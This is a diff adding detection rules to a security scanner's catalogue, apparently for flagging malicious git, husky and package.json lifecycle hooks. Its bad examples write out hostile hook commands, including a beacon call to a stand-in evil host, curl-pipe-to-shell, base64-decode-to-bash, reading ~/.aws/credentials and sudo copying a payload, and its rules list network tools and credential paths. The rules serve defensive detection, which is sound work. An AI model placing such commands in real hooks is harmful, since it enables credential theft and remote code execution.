@@ -2299,3 +2299,70 @@ examples_good = ["There is essentially no benign reason for /tmp to be on $PATH"
 false_positive_guidance = "Almost never legitimate. If a tool added /tmp to your $PATH, investigate it."
 remediation = "Remove the /tmp directory from $PATH immediately and investigate how it got there. Run `tirith path audit` to confirm it is gone."
 mitre_id = "T1574.007"
+
+# ─── Repo-hook / automation guard rules (M9 ch6) ──────────────────────────────
+# Fire from the `tirith hooks scan|guard|explain` scanner (crate::repo_hooks),
+# which classifies a hook BODY as text and NEVER executes it. The three High
+# rules can also surface on the exec hot path when `policy.hooks_guard_enabled`
+# is set and a hot-path git/package-manager command runs in a repo whose
+# triggered hooks carry them.
+
+[[rule]]
+id = "repo_hook_network_call"
+title = "Repo hook makes a network call"
+category = "hooks"
+severity_rationale = "High — a curl/wget/nc command word inside a git/husky/lefthook/pre-commit hook or a package.json lifecycle script runs automatically on `git commit` / `npm install`. A network call there is a stealthy download-execute or exfiltration channel that fires without the developer ever typing it."
+description = "A repo hook body invokes curl, wget, nc, ncat, or netcat as a command word. Detected by the `tirith hooks` scanner over the hook body (treated as text, never executed)."
+examples_bad = ["A `.husky/pre-commit` containing `curl https://evil.example/beacon`", "A package.json postinstall of `curl https://x | sh`"]
+examples_good = ["A pre-commit that runs `npm run lint` / `lint-staged` with no network call"]
+false_positive_guidance = "Some legitimate hooks fetch a tool or upload coverage. Review the hook body — `tirith hooks explain <name>` shows it (credential-redacted) — and add the hook to your review baseline if it is intentional."
+remediation = "Open the hook (`tirith hooks explain <name>`), confirm the network call is intended, and pin/verify any downloaded content. Remove or vet hooks you did not author."
+mitre_id = "T1059.004"
+
+[[rule]]
+id = "repo_hook_credential_read"
+title = "Repo hook reads a credential file"
+category = "hooks"
+severity_rationale = "High — a hook body that references ~/.aws, ~/.ssh, .env, ~/.npmrc, ~/.git-credentials, or similar reads your secrets every time it fires (every commit / install). That is a credential-theft foothold a malicious or compromised hook uses to harvest tokens."
+description = "A repo hook body references a well-known credential file or directory. Detected by the `tirith hooks` scanner over the hook body."
+examples_bad = ["A pre-push hook running `cat ~/.aws/credentials`", "A postinstall reading `.env` and POSTing it somewhere"]
+examples_good = ["A hook that reads a project-local, non-secret config file"]
+false_positive_guidance = "A hook may legitimately read a project `.env` for a non-secret value. Review the body and confirm no secret leaves the machine."
+remediation = "Review the hook (`tirith hooks explain <name>`). Ensure no credential is read and forwarded. Rotate any secret a suspicious hook could have read."
+mitre_id = "T1552.001"
+
+[[rule]]
+id = "repo_hook_sudo"
+title = "Repo hook uses sudo"
+category = "hooks"
+severity_rationale = "High — `sudo` inside a hook escalates privilege automatically on an everyday git / package-manager command. A developer running `git commit` does not expect a root action; a malicious hook uses this to install persistence or modify system files."
+description = "A repo hook body uses `sudo` as a command word. Detected by the `tirith hooks` scanner over the hook body."
+examples_bad = ["A pre-commit running `sudo rm -rf /var/cache`", "A postinstall doing `sudo cp payload /usr/local/bin`"]
+examples_good = ["Hooks should not need root; there is rarely a benign reason for sudo in a repo hook"]
+false_positive_guidance = "Repo hooks almost never legitimately need sudo. If one does, it should be loudly documented; treat an undocumented sudo as suspicious."
+remediation = "Review the hook (`tirith hooks explain <name>`). Remove the sudo or replace it with an unprivileged action. Never run hooks from an untrusted repo."
+mitre_id = "T1548.003"
+
+[[rule]]
+id = "repo_hook_suspicious_shell_pattern"
+title = "Repo hook uses a suspicious shell pattern"
+category = "hooks"
+severity_rationale = "Medium — a hook body that pipes into a shell interpreter (`… | sh`), decodes base64 then executes, or uses `eval` matches the classic obfuscated-payload shape. Reported at Medium (not Block) because each pattern has legitimate uses, but the combination inside an auto-run hook is worth surfacing."
+description = "A repo hook body pipes into sh/bash/python/etc, decodes base64, or uses eval. Detected by the `tirith hooks` scanner over the hook body."
+examples_bad = ["A pre-commit doing `cat payload.txt | sh`", "A hook with `echo <b64> | base64 -d | bash`"]
+examples_good = ["A hook that pipes file lists into a formatter, not an interpreter"]
+false_positive_guidance = "Piping into an interpreter or using eval is sometimes legitimate tooling. Review the body to confirm the source of the piped/decoded content is trusted."
+remediation = "Review the hook (`tirith hooks explain <name>`). Confirm what is being piped/decoded and that its source is trusted. Avoid `curl | sh`-style hooks entirely."
+mitre_id = "T1027"
+
+[[rule]]
+id = "repo_hook_external_fetch"
+title = "Repo hook fetches an external resource"
+category = "hooks"
+severity_rationale = "Medium — a hook body that references an http(s):// URL or runs a remote package (`npx` / `pnpm dlx`) reaches out to the network on an everyday command. Reported at Medium because fetching a tool is common, but an auto-run external fetch is a supply-chain surface worth surfacing."
+description = "A repo hook body references an external URL or runs a remote-package runner (npx / pnpm dlx). Detected by the `tirith hooks` scanner over the hook body."
+examples_bad = ["A `.envrc` with `source_url https://example.test/setup.sh`", "A postinstall of `npx some-remote-tool@latest setup`"]
+examples_good = ["A hook that runs locally-installed tooling with no remote fetch"]
+false_positive_guidance = "Running a pinned remote tool can be legitimate. Prefer pinned versions + integrity hashes; review unfamiliar URLs / packages."
+remediation = "Review the hook (`tirith hooks explain <name>`). Pin remote packages to a version + integrity hash, or vendor them locally. Investigate URLs you do not recognize."
+mitre_id = "T1195.002"
